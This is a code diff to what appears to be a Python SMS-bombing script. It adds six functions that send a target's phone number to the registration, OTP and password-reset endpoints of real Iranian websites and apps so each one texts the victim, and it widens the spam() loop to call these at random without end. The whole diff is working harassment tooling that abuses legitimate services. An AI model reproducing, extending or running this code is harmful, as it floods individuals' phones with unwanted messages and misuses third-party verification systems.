@@ -333,11 +333,78 @@ def ASM30(number):
 			return 1
 
 
+def ASM31(number):
+	number = '0' + number
+	data = {'Phone':number, 'Version':'C'}
+	s = requests.post('https://sirsheed.ir/api/sms', data = data).json()
+	if(s['StatusCode'] == 200 and s['ResponseMessage'] == 1):
+		return 1
+	else:
+		data = {'MeliOrPhone':number, 'Version': 'c'}
+		r = requests.post('https://sirsheed.ir/api/customersregister/Forgotpass', data = data).json()
+		if(r['StatusCode'] == 200):
+			return 1
+
+
+def ASM32(number):
+	number = '0' + number
+	djson = {'firstName': 'ممد', 'lastName': 'ممدی',
+	'phoneNumber': number, 'primaryAddress': {'address': '', 'location': {'lat': 35.6995320, 'lng': 51.337797}}, 'setLocation': True}
+	s = requests.post('https://www.mamanpaz.ir/api/register?new=', json = djson).json()
+	if(s['message'] == 'داده ای با این مشخصات وجود دارد'):
+		djson = {'phoneNumber':number}
+		r = requests.post('https://www.mamanpaz.ir/api/forgot', json = djson).json()
+		if(r['message'] == 'رمز عبور موقت برای شما پیامک شد.'):
+			return 1
+	else:
+		return 1
+
+
+def ASM33(number):
+	number = '0' + number
+	djson = {'aff':'', 'forceOtp':False, 'phone':number}
+	s = requests.post('https://api.taaghche.com/mybook/site/otp/phone', json = djson).json()
+	try:
+		res = s['systemNotifications'][0]['additionalData']
+		if(s['systemNotifications'][0]['additionalData'] == 'کد تایید به شماره موبایل شما پیامک شد'):
+			return 1
+	except KeyError:
+		return None
+
+
+def ASM34(number):
+	number = '0' + number
+	s = requests.get('https://api.torob.com/a/phone/send-pin/?phone_number=' + number).json()
+	if(s['message'] == 'pin code sent'):
+		return 1
+
+
+def ASM35(number):
+	number = '0' + number
+	data = {'cellNumber':number}
+	s = requests.post('https://bama.ir/signin-checkforcellnumber', data = data).json()
+	if(s['ResponseCode'] == 200 and s['Message'] == 'کد تایید برای ثبت نام ارسال شد'):
+		return 1
+	elif(s['Result'] == 'OldUser'):
+		data = {'cellNumber':number}
+		r = requests.post('https://bama.ir/signin-send-otp', data = data).json()
+		if(r['ResponseCode'] == 200 and r['Message'] == 'کد تایید برای ثبت نام ارسال شد'):
+			return 1
+
+
+def ASM36(number):
+	number = '98' + number
+	djson = {'api_version':'3', 'method':'sendCode', 'data':{'phone_number':number, 'send_type':'SMS'}}
+	s = requests.post('https://messengerg2c4.iranlms.ir/', json = djson).json()
+	if(s['status'] == 'OK'):
+		return 1
+
+
 def spam(phonenum):
 	done = 0
 	while(True):
 		try:
-			k = eval('ASM' + str(random.randint(1, 30)) + '(phonenum)')
+			k = eval('ASM' + str(random.randint(1, 36)) + '(phonenum)')
 			time.sleep(1)
 		except requests.exceptions.ConnectionError:
 			continue
